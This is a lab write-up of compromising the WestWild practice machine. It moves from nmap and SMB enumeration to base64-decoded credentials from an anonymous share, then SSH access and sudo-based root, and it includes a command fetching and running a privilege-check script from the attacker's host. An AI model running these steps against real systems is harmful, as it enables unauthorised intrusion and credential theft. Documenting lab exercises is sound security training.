# 🛡️ WestWild Machine Writeup – Full Compromise (SMB → SSH → Root)

## 📌 Overview

This project demonstrates a full compromise of the **WestWild** machine through systematic penetration testing methodology. The attack chain involved **SMB enumeration, credential discovery, SSH access, and privilege escalation**, ultimately resulting in **root access**.

⚠️ **Disclaimer:** This activity was performed in a controlled lab environment for educational purposes only.

---

## 🔍 1. Reconnaissance (Nmap Scan)

Initial scanning was performed to identify open ports and services:

```bash
nmap -sC -sV -oN nmap_scan.txt <192.168.10.8>
```

### 🧾 Results:

* **22/tcp** – SSH
* **80/tcp** – HTTP
* **139/tcp** – SMB
* **445/tcp** – SMB

👉 Presence of SMB (139, 445) indicated potential for misconfiguration or sensitive data exposure.

https://github.com/Salik921/WestWild-Machine-Writeup-Full-Compromise-SMB-SSH-Root-/blob/1cc130837f7f4481cab3dae258f8edae848f49c8/Screenshot%202026-04-09%20135718.png

## 🧠 2. SMB Enumeration

SMB enumeration was conducted to gather users, shares, and configurations:

```bash
enum4linux 192.168.10.8
```

### 🔎 Findings:

* Discovered user: **wave**
* SMB shares accessible
  
https://github.com/Salik921/WestWild-Machine-Writeup-Full-Compromise-SMB-SSH-Root-/blob/9ec42507255c497391db22f5a4edeb7ef4a61b6e/Screenshot%202026-04-09%20140009.png

Further enumeration using smbclient:

```bash
smbclient //192.168.10.8/wave

```
https://github.com/Salik921/WestWild-Machine-Writeup-Full-Compromise-SMB-SSH-Root-/blob/42f181bf7680b41694e4a87be88453229458112a/Screenshot%202026-04-09%20140114.png

### 🚨 Critical Finding:

* **Anonymous login allowed**
* Found an **encoded message** inside the share

---

## 🕵️ 3. Credential Extraction

The encoded message was analyzed and decoded:

```bash
echo "<encoded_text>" | base64 -d
```

### 🔓 Result:

* Extracted valid **username and password**

👉 This indicates **poor credential management and sensitive data exposure**.

---

## 🚪 4. Initial Access (SSH Login)

Using discovered credentials:

```bash
ssh <username>@<target_ip>
```

### ✅ Result:

* Successfully gained shell access

---

## 🧪 5. Local Enumeration (Privilege Escalation Phase)

Post-exploitation enumeration was performed:

```bash
wget http://192.168.10.7:9000/linuxprivchecker.py
chmod +x linuxprivchecker.py
./linuxprivchecker.py
```

### 🔎 Findings:

* Identified a **suspicious executable file**
* The file contained or revealed additional credentials

---

## 🔐 6. Privilege Escalation

### Step 1: Switch User

```bash
su aveng
```

### Step 2: Escalate Privileges

```bash
sudo su
```

### 🚀 Result:

* **Root access obtained**

---

## 🧩 Attack Chain Summary

1. Nmap scan → identified SMB & SSH
2. SMB enumeration → found user + anonymous access
3. Extracted encoded message → decoded credentials
4. SSH login → gained initial access
5. Local enumeration → found executable with creds
6. User pivot (aveng) → sudo → root

---

## ⚠️ Vulnerabilities Identified

* SMB Anonymous Access Enabled
* Sensitive Data Exposure (Encoded Credentials)
* Weak Credential Storage Practices
* Misconfigured Executable / Credential Leakage
* Improper Privilege Management (sudo access)

---

## 💡 Key Learnings

* Always enumerate SMB thoroughly
* Encoded ≠ secure (base64 is reversible)
* Post-exploitation enumeration is critical
* Privilege escalation often comes from misconfigurations
* Chaining small weaknesses leads to full compromise

---

## 🏁 Conclusion

This machine highlights how multiple minor vulnerabilities—when chained together—can lead to a complete system compromise. The attack demonstrates real-world penetration testing techniques including **enumeration, credential harvesting, lateral movement, and privilege escalation**.

---

## 🔥 Author

**Salik Karimkhan**
Aspiring Penetration Tester | CEH Student | Red Team Enthusiast

---
